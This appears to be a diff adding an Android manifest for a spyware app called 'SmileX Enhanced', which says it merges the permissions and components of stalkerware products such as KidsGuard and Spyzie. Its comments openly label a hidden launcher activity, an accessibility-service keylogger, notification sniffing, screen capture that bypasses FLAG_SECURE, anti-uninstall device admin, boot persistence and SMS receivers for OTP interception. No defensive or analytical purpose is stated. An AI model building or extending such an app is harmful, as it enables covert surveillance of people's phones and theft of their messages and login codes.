@@ -1,0 +1,271 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    SmileX Enhanced APK - Unified Manifest
+    Combines all permissions and components from KidsGuard, Spyzie, hwapp391
+    Compatible: Android 4.4 (API 19) to Android 14 (API 34)
+    Updated for 2026 techniques.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.smilex.enhanced"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <!-- ===== CORE NETWORK ===== -->
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+
+    <!-- ===== PHONE & IDENTITY ===== -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+
+    <!-- ===== LOCATION ===== -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <!-- Android 10+ background location -->
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+
+    <!-- ===== MEDIA ===== -->
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+
+    <!-- ===== STORAGE ===== -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <!-- Android 11+ scoped storage bypass -->
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+
+    <!-- ===== CONTACTS & MESSAGES ===== -->
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.WRITE_CALENDAR"/>
+
+    <!-- ===== APP MONITORING ===== -->
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+
+    <!-- ===== SYSTEM OVERLAY & CONTROL ===== -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.REORDER_TASKS"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+
+    <!-- ===== PERSISTENCE & BACKGROUND ===== -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+
+    <!-- ===== BLUETOOTH ===== -->
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+    <!-- Android 12+ Bluetooth -->
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN"/>
+
+    <!-- ===== NOTIFICATIONS (Android 13+) ===== -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <!-- ===== BROWSER HISTORY ===== -->
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+
+    <!-- ===== PUSH / GCM ===== -->
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+
+    <!-- ===== SMS RETRIEVER API (for OTP interception) ===== -->
+    <uses-permission android:name="com.google.android.gms.permission.AUTH_PROVIDE_IMAGE_DATA"/>
+    <uses-permission android:name="com.google.android.gms.permission.AUTH_SET_IMAGE_DATA"/>
+    <uses-permission android:name="com.google.android.gms.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+    <uses-permission android:name="com.google.android.gms.permission.AD_ID"/>
+        <!-- Permissions for MediaProjection (Screen Capture) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+
+
+    <application
+        android:allowBackup="false"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:requestLegacyExternalStorage="true"
+        android:usesCleartextTraffic="true">
+
+        <!-- ===== MAIN STEALTH ACTIVITY ===== -->
+        <activity
+            android:name=".activities.MainActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <!-- ===== CORE MONITORING SERVICE ===== -->
+        <service
+            android:name=".services.CoreMonitorService"
+            android:exported="false"
+            android:enabled="true"/>
+
+        <!-- ===== LOCATION SERVICE ===== -->
+        <service
+            android:name=".services.LocationService"
+            android:exported="false"
+            android:enabled="true"/>
+
+        <!-- ===== CALL RECORDER SERVICE ===== -->
+        <service
+            android:name=".services.CallRecorderService"
+            android:exported="false"
+            android:enabled="true"/>
+
+        <!-- ===== ACCESSIBILITY SERVICE (IM Reader / Keylogger) ===== -->
+        <service
+            android:name=".services.AccessibilityMonitorService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config"/>
+        </service>
+
+        <!-- ===== NOTIFICATION LISTENER (Message Sniffing) ===== -->
+        <service
+            android:name=".services.NotificationListenerService"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+
+        <!-- ===== LIVE STREAM CAPTURE SERVICE (FLAG_SECURE Bypass) ===== -->
+        <service
+            android:name=".services.LiveStreamCaptureService"
+            android:exported="false"
+            android:enabled="true"
+            android:foregroundServiceType="mediaProjection"/>
+
+
+        <!-- ===== DEVICE ADMIN (Anti-uninstall) ===== -->
+        <receiver
+            android:name=".receivers.DeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== BOOT RECEIVER (Persistence) ===== -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== CALL RECEIVER ===== -->
+        <receiver
+            android:name=".receivers.CallReceiver"
+            android:exported="true">
+            <intent-filter android:priority="-1">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== SMS RECEIVER ===== -->
+        <receiver
+            android:name=".receivers.SmsReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== NETWORK CHANGE RECEIVER ===== -->
+        <receiver
+            android:name=".receivers.NetworkReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== POWER EVENTS RECEIVER ===== -->
+        <receiver
+            android:name=".receivers.PowerReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.ACTION_BATTERY_LOW"/>
+                <action android:name="android.intent.action.ACTION_BATTERY_CHANGED"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- ===== ALARM RECEIVER (Periodic Tasks) ===== -->
+        <receiver android:name=".receivers.AlarmReceiver" android:exported="true"/>
+
+        <!-- ===== FILE PROVIDER ===== -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="com.smilex.enhanced.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/provider_paths"/>
+        </provider>
+
+        <!-- ===== SMS RETRIEVER SERVICE (for OTP interception) ===== -->
+        <service android:name="com.google.android.gms.auth.api.phone.SmsRetriever" android:exported="true">
+            <intent-filter>
+                <action android:name="com.google.android.gms.auth.api.phone.SMS_RETRIEVED"/>
+            </intent-filter>
+        </service>
+
+        <!-- ===== SMS RETRIEVER BROADCAST RECEIVER (for OTP interception) ===== -->
+        <receiver
+            android:name=".receivers.SmsRetrieverBroadcastReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.google.android.gms.auth.api.phone.SMS_RETRIEVED"/>
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
